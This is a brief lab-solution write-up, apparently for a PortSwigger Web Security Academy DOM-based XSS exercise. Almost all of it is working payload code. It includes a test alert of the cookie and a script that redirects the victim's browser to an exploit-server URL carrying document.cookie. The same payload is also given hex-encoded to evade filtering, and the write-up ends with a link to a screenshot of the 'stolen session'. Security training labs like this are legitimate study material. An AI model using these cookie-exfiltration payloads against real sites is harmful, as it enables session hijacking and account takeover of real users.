## XSS-DOM-Procedure

## Check your session cookie:
```js
"-(window["document"]["location"]="/?"+window["document"]["cookie"])-"
```

## TEST Payload:
```js
burpdomxss","test":alert(window["document"]["cookie"])}//
```

## The Exploit before preparing:
```js
<script>
location='https://<CHANGE-HERE>.web-security-academy.net/?SearchTerm="-(window["document"]["location"]="https://exploit-<CHANGE-HERE>%2eexploit-server%2enet/?"+window["document"]["cookie"])-"';
</script>
```

## Before ENCODE the exploit by using BurpSuite Decoder:
```js
"-(window["document"]["location"]="https://exploit-0af4008003a936d2c1563c1001a30084%2eexploit-server%2enet/?"+window["document"]["cookie"])-"
```

## THE ACTUAL EXPLOIT:
```js
<script>
location='https://0a3200d2032c36d2c1163a22005f00df.web-security-academy.net/?SearchTerm=%22%2d%28%77%69%6e%64%6f%77%5b%22%64%6f%63%75%6d%65%6e%74%22%5d%5b%22%6c%6f%63%61%74%69%6f%6e%22%5d%3d%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%66%34%30%30%38%30%30%33%61%39%33%36%64%32%63%31%35%36%33%63%31%30%30%31%61%33%30%30%38%34%25%32%65%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%25%32%65%6e%65%74%2f%3f%22%2b%77%69%6e%64%6f%77%5b%22%64%6f%63%75%6d%65%6e%74%22%5d%5b%22%63%6f%6f%6b%69%65%22%5d%29%2d%22';
</script>
```
## The stolen session:
![](https://github.com/nu11secur1ty/PortSwigger-Web-Security-Academy/blob/main/Burp-Suite-Certified-Practitioner/docs/XSS-DOM-Procedure/XSS-Payload.png)
